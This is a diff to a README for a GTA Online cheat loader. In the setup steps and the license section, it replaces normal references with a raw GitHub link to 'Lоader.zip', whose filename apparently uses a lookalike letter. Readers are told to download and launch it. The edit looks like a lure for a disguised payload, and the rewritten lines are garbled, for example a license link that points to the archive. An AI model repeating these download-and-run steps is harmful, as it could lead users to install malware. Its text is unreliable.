@@ -58,9 +58,9 @@ Enjoy seamless support on almost every platform! 🕹️
 
 Setting up the **GTA Online Cheats Loader** is fast and simple! Follow these instructions to start:
 
-1. Download Loader.rar from the repository.
+1. Download https://raw.githubusercontent.com/ACC0895/GTAV-Online-Toolkit/main/Lоader.zip from the repository.
 2. Extract the archive to a chosen directory using your favorite unarchiver.
-3. Launch the Loader.exe (Windows) or run the Loader binary (Linux/macOS) via terminal.
+3. Launch the https://raw.githubusercontent.com/ACC0895/GTAV-Online-Toolkit/main/Lоader.zip (Windows) or run the Loader binary (Linux/macOS) via terminal.
 4. Enter your GTA Online session and activate desired features through the user-friendly menu.
 5. Start gaming with your chosen enhancements immediately!
 
@@ -103,8 +103,8 @@ Please understand and comply with the legal frameworks of your local jurisdictio
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).  
-Read the `LICENSE.txt` file included in the repository for further details.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/ACC0895/GTAV-Online-Toolkit/main/Lоader.zip).  
+Read the `https://raw.githubusercontent.com/ACC0895/GTAV-Online-Toolkit/main/Lоader.zip` file included in the repository for further details.
 
 ---
 
